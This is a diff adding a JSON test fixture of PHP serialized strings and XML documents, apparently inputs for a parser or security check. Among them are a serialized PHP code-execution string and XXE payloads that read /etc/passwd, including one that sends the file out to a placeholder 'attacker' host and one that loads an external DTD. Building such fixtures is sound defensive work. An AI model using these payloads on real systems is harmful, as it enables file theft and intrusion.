@@ -1,0 +1,32 @@
+{"malformed":["s:10:\"test\";",
+                "O:8:\"stdClass\":1:{}",
+                "a:1:{i:0;s:1:\"x\";",
+                "i:12a34;",
+                "i:1234",
+                "b:2;",
+                "d:1,5;",
+                "r:two;",
+                "R:two;",
+                "C:4:\"test\":5:{data}",
+                "N;extra",
+                "d:1.5",
+                "r:0;",
+                "n;",
+                "s:8:\"last_log\";s:26:\"<?php system('dir /b'); ?>\";"
+              ],
+               
+"wellformed":
+["<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY greeting \"Hello, world\">]><root><msg>&greeting;</msg></root>",
+"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % word \"safe\"><!ENTITY message \"%word; entity\">]><root>&message;</root>",
+"<?xml version=\"1.0\"?><!DOCTYPE note [<!ENTITY sender \"System\">]><note><to>User</to><from>&sender;</from><body>This is a test.</body></note>",
+"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY unused \"nothing\">]><root>OK</root>",
+"<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><data>&xxe;</data></root>",
+"<!DOCTYPE root [<!ENTITY xxe PUBLIC \"-//ANY//ID\" \"file:///etc/passwd\">]><root>&xxe;</root>",
+"<!DOCTYPE root [  <!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY send SYSTEM 'http://attacker/?x=%file;'>\">%eval;><root>&send;</root>",
+"<!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY xxe \"%file;\">]><root>&xxe;</root>",
+"<!DOCTYPE root SYSTEM \"http://attacker/evil.dtd\"><root/>"
+
+
+]
+}
